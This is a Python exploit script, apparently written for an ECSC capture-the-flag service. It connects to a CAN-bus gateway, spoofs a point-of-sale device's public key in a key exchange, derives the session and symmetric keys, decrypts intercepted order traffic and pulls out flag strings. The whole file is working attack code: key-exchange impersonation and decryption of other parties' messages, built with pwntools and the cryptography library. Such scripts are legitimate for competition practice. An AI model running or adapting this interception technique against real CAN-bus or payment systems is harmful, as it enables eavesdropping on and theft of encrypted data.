#!/usr/bin/env python3
import hashlib
import requests
import msgpack
import can
import re
from pwn import *

from hashlib import blake2s
from cryptography.hazmat.primitives.asymmetric.x25519 \
    import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.serialization \
    import Encoding, PublicFormat
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead \
    import ChaCha20Poly1305
from cryptography.exceptions import InvalidTag

# Exploit utils, should be in the same folder
import util

if __name__ == '__main__':
    gw_port = 10020
    api_port = 10021
    ip = '10.10.2.1'
    #ip = '127.0.0.1'
    base_url = f'http://{ip}:{api_port}'

    #context.log_level = 'debug'
    r = remote(ip, gw_port)

    ## We know the hardcoded key of the point-of-sale application
    ## so we wait and listen for a key exchange
    msg = util.CanFilter([
        # MSGID_KEY_EXCH_PUBKEY_BROADCAST,
        # MSGID_KEY_EXCH_SHARE_SYMMETRIC,
        # MSGID_KEY_EXCH_REKEY_NOTIFY,
        # MSGID_KEY_EXCH_REQUEST_PUBKEY
        (0x1ffffffc, 0x100), 
        # MSGID_POS_ORDER_DATA
        (0x1fffffff, 0x201)
    ])
    r.send(msg.pack())
    
    # Track protocol state
    pos_privkey = X25519PrivateKey.generate()
    ks_pubkey = None
    derived_key = None
    symmetric_key = None
    sessions = []
    session_data = {}
    flags_found = set()

    # Have a long running loop for message collection
    info('Sniffing CAN-bus traffic in a long-running loop')
    unpacker = msgpack.Unpacker(r, use_list=False)
    for msg in unpacker:
        if msg[0] == util.ToCanMsgType.CAN_FRAME:
            msg = util.CanFrame.unpack(msg[1])
            can_msg = msg.can_message
            if can_msg.arbitration_id == 0x102:
                info('sending pubkey')
                pubbytes = pos_privkey.public_key().public_bytes(
                        Encoding.Raw,
                        PublicFormat.Raw
                )
                pubdigest = blake2s(pubbytes).digest()
                msg = can.Message(
                    arbitration_id=0x10110,
                    data=pubbytes + pubdigest,
                    is_extended_id=True,
                    is_fd=True
                )

                ticket = util.get_ticket(base_url)            
                r.send(util.CanToken(ticket).pack())
                r.send(util.CanFrame(msg).pack())
            elif can_msg.arbitration_id == 0x100:
                # Got keyserver public key
                pubkey = bytes(can_msg.data[:32])
                ks_pubkey = X25519PublicKey.from_public_bytes(pubkey)
                shared_key = pos_privkey.exchange(ks_pubkey)
                derived_key = HKDF(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=None,
                    info=b'keyserver-exch'
                ).derive(shared_key)
            elif can_msg.arbitration_id == 0x101:
                if derived_key is None:
                    continue

                # Got symmetric key, try decrypting
                nonce = bytes(can_msg.data[:12])
                ct = bytes(can_msg.data[12:])
                cipher = ChaCha20Poly1305(derived_key)
                try:
                    symmetric_key = cipher.decrypt(nonce, ct, None)
                    info(f'symm: {symmetric_key.hex()}')
                except InvalidTag:
                    info('invalid symm tag')
                    continue
            elif can_msg.arbitration_id == 0x201:
                if symmetric_key is None:
                    continue
                if len(can_msg.data) < 34:
                    continue

                # Try decrypting
                session_id = u32(bytes(can_msg.data[:4]), endian='big')
                cipher = ChaCha20Poly1305(symmetric_key)
                data = b''
                try:
                    ad = bytes(can_msg.data[:5])
                    nonce = bytes(can_msg.data[len(ad):len(ad) + 12])
                    ct = bytes(can_msg.data[len(ad) + len(nonce):])

                    data = cipher.decrypt(nonce, ct, ad)
                except InvalidTag:
                    info('invalid tag')

                if session_id not in session_data:
                    session_data[session_id] = b''
                sessions.append(session_id)
                sessions = sessions[-200:]
                session_data[session_id] += data
        elif msg[0] == util.ToCanMsgType.CAN_ERROR:
            error(str(util.CanError(msg[1])))

        # List all session data
        for s in set(sessions):
            m = re.search(b'ECSC_[A-Za-z0-9\\+/]{32}', session_data[s])
            if m:
                flag = m.group(0)
                if flag not in flags_found:
                    info(flag)
                    flags_found.add(flag)

